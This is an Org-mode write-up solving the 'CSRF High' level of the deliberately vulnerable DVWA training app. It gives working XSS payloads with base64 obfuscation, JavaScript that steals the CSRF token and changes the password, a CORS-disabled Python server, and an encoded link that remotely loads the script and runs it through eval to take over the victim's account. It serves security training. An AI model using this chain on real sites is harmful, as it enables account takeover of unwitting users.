#+TITLE: DVWA - CSRF High
#+AUTHOR: Leonardo Tamiano

* Description
  If we now try the previous URL, this does not work anymore, because

  1. We need another exploit for obtaining a reflective XSS on the
     high security level

  2. The password change endpoint is protected with a CSRF token.

* Solution
  
  To fix the first problem, we realize that for solving the high
  reflective XSS level we need the following payload

  #+begin_src html
<img src='#' onerror=alert(1) />
  #+end_src

  Even like this, if we just put the previous payload,

  #+begin_src html
<Script> var xmlHttp = new XMLHttpRequest(); var url = "http://evil/vulnerabilities/csrf/?password_new=newpass&password_conf=newpass&Change=Change"; xmlHttp.open("GET", url, false); xmlHttp.send(null); </Script>
  #+end_src

  which has to be base64d and decoded with the ~atob~ function otherwise
  we get blocked, it won't work because of the CSRF code.

  #+begin_src html
<img src='#' onerror="var xmlHttp = new XMLHttpRequest(); xmlHttp.open('GET', atob('aHR0cDovL2V2aWwvdnVsbmVyYWJpbGl0aWVzL2NzcmYvP3Bhc3N3b3JkX25ldz1uZXdwYXNzJnBhc3N3b3JkX2NvbmY9bmV3cGFzcyZDaGFuZ2U9Q2hhbmdl'), false); xmlHttp.send(null);" />
  #+end_src

  The idea then is to first do a GET request, extract the CSRF code,
  and then send it in the URL. In particular, we want to create the
  following URL

  #+begin_example
GET /vulnerabilities/csrf/?password_new=test&password_conf=test&Change=Change&user_token=6bed618fc0eaf44857bfa115c4c61a79
  #+end_example

  where ~user_token~ was obtained from a previous GET request to CSRF
  change password page. To create such URL we first experiment with JS
  code that is able to extract the ~user_token~ from the webpage in
  order to craft a valid GET request for changing the password of the
  user with a custom password. The following JS code does the job.

  #+begin_src javascript
var newpass = "test"
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://evil/vulnerabilities/csrf/', false);
xhr.onload = function() {
    var doc = new DOMParser().parseFromString(this.responseText, "text/xml");
    var csrf = doc.getElementsByName("user_token")[0].getAttribute("value");
    var xhr2 = new XMLHttpRequest();    
    xhr2.open('GET', `http://evil/vulnerabilities/csrf/?password_new=${newpass}&password_conf=${newpass}&Change=Change&user_token=${csrf}`, false);
    xhr2.send(null);
};
xhr.send(null);
  #+end_src

  We save this payload onto a file called ~high.js~.

  Now we need to find a way to execute this JS payload onto the victim
  browser. To avoid the block of the hard challenge of the reflected
  XSS, the idea is to write a small loader that loads a much bigger
  javascript file and executes it with *eval*. We can load this file by
  creating a malicious server which *disables CORS checks*. The code for
  such server is shown below

  #+begin_src python
#!/usr/bin/env python3

from http.server import HTTPServer, SimpleHTTPRequestHandler, test
import sys

class CORSRequestHandler (SimpleHTTPRequestHandler):
    def end_headers (self):
        self.send_header('Access-Control-Allow-Origin', '*')
        SimpleHTTPRequestHandler.end_headers(self)

if __name__ == '__main__':
    test(CORSRequestHandler, HTTPServer, port=int(sys.argv[1]) if len(sys.argv) > 1 else 8000)
  #+end_src

  We save that in ~high-cors-server.py~ and then execute it as follows

  #+begin_src sh
python3 high-cors-server.py
  #+end_src

  Once we have that running, we can use the following payload on the
  high reflected XSS challenge page of DVWA

  #+begin_src html
<img src='#' onerror="var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://localhost:8000/high.js', false); xhr.onload = function () {eval(this[atob('cmVzcG9uc2VUZXh0')])}; xhr.send(null); " />
  #+end_src

  This payload is encoded into the following GET request.

  #+begin_example
http://evil/vulnerabilities/xss_r/?name=%3Cimg+src%3D%27%23%27+onerror%3D%22var+xhr+%3D+new+XMLHttpRequest%28%29%3B+xhr.open%28%27GET%27%2C+%27http%3A%2F%2Flocalhost%3A8000%2Fhigh.js%27%2C+false%29%3B+xhr.onload+%3D+function+%28%29+%7Beval%28this%5Batob%28%27cmVzcG9uc2VUZXh0%27%29%5D%29%7D%3B+xhr.send%28null%29%3B+%22+%2F%3E
  #+end_example

  by changing the ~newpass~ of the ~high.js~ script, we will control the
  password of the authenticated user who clicks on the previous
  link. In particular, when the user clicks on the link, the following
  things will happen:

  - The reflective XSS on the DVWA page is triggered, executing the
    malicious js within the victim browser.

  - The malicious js does a GET to the endpoint
    http://localhost:8000/high.js and performs an ~eval~ on the obtained
    text from the server.

  - The javascript code loaded performs two GETs. One to obtian the
    CSRF code from the DVWA change password page, and the second to
    set a new password using the previous CSRF token.

  - As soon as the second GET hits the server, the password of the
    user is changed by the server.

* References
  For the making of this solution the following resource were used:

  - https://stackoverflow.com/questions/21956683/enable-access-control-on-simple-http-server
  - https://labs.withsecure.com/publications/getting-real-with-xss
